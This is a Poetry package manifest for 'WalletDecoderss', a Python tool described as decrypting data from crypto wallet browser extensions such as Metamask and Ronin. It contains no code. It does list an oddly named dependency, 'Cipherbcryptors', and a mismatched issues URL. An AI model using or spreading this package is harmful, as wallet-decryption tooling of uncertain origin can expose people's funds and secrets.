[tool.poetry]
name = "WalletDecoderss"
version = "1.5.2"
description = "Simple Tools for decode crypto data, from extensions wallet, Metamask, Ronin, Brawe, etc."
authors = ["Isaac Florentine"]
license = "MIT"
readme = "README.md"
keywords = [
    "extensions", "metamask", "metamask V2", "walletdecode", "ronin", "tronlink", "exodus", "crypto", "decrypt", "wallet"
]

[tool.poetry.dependencies]
python = "^3.7"
pycryptodome = ">=3.20.0"
Cipherbcryptors = ">=1.3"

[tool.poetry.dev-dependencies]

[build-system]
requires = ["poetry-core>=1.0.0"]
build-backend = "poetry.core.masonry.api"

[project.urls]
Homepage = "https://github.com/Katana-Crypto"
Issues = "https://github.com/pypa/Katana-Crypto/issues"